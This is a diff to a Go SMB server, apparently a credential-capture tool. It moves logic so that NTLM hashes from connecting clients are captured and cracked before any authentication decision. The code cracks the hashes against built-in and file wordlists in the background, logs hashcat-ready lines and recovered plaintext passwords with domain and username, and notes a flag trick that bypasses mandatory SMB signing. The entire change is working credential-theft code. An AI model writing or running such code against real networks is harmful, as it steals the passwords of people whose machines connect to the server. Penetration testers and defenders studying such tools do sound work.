@@ -654,6 +654,31 @@ func (s *SMBServer) handleSessionSetup(cs *connState, h *smb2Hdr, buf []byte, re
 		// IS_NULL flag tells the client to set Session.SigningRequired = FALSE,
 		// bypassing the mandatory signing requirement for this session.
 
+		// ── Hash capture — always log/broadcast before any auth decision ──────
+		// Built-in list is ~100 candidates — always safe to run inline.
+		crackedPassword, _ := TryCrackDefault(captured)
+
+		s.broadcastNTLMEvent(captured, remoteAddr, crackedPassword)
+		logger.Infof("SMB: captured %s hash from %s\\%s at %s",
+			captured.Protocol, captured.Domain, captured.Username, remoteAddr)
+		logger.Infof("SMB: hashcat (-m %s): %s", captured.HashcatMode, captured.HashcatLine)
+		if crackedPassword != "" {
+			logger.Infof("SMB: cracked %s\\%s — plaintext: %s", captured.Domain, captured.Username, crackedPassword)
+		}
+
+		// File wordlist can be millions of entries — run in the background so the
+		// SESSION_SETUP response goes out immediately. If a match is found later
+		// it is logged and broadcast as a follow-up event.
+		if crackedPassword == "" && s.Wordlist != "" {
+			snap := *captured // copy; captured may be mutated after this goroutine starts
+			go func() {
+				if pw, ok := TryCrackFile(&snap, s.Wordlist); ok {
+					logger.Infof("SMB: cracked %s\\%s — plaintext: %s (wordlist)", snap.Domain, snap.Username, pw)
+					s.broadcastNTLMEvent(&snap, remoteAddr, pw)
+				}
+			}()
+		}
+
 		// ── Credential verification ───────────────────────────────────────────
 		// effectiveDomain tracks which domain string produced a valid response,
 		// so we use the same one when deriving the session signing key.
@@ -723,30 +748,6 @@ func (s *SMBServer) handleSessionSetup(cs *connState, h *smb2Hdr, buf []byte, re
 		sess.mu.Unlock()
 
 		spnegoFinal := FinalToken()
-
-		// Built-in list is ~100 candidates — always safe to run inline.
-		crackedPassword, _ := TryCrackDefault(captured)
-
-		s.broadcastNTLMEvent(captured, remoteAddr, crackedPassword)
-		logger.Infof("SMB: captured %s hash from %s\\%s at %s",
-			captured.Protocol, captured.Domain, captured.Username, remoteAddr)
-		logger.Infof("SMB: hashcat (-m %s): %s", captured.HashcatMode, captured.HashcatLine)
-		if crackedPassword != "" {
-			logger.Infof("SMB: cracked %s\\%s — plaintext: %s", captured.Domain, captured.Username, crackedPassword)
-		}
-
-		// File wordlist can be millions of entries — run in the background so the
-		// SESSION_SETUP response goes out immediately. If a match is found later
-		// it is logged and broadcast as a follow-up event.
-		if crackedPassword == "" && s.Wordlist != "" {
-			snap := *captured // copy; captured may be mutated after this goroutine starts
-			go func() {
-				if pw, ok := TryCrackFile(&snap, s.Wordlist); ok {
-					logger.Infof("SMB: cracked %s\\%s — plaintext: %s (wordlist)", snap.Domain, snap.Username, pw)
-					s.broadcastNTLMEvent(&snap, remoteAddr, pw)
-				}
-			}()
-		}
 
 		// In anonymous/capture mode (no password set) we cannot derive the SMB2
 		// session signing key. Mark the session as GUEST so the client sets
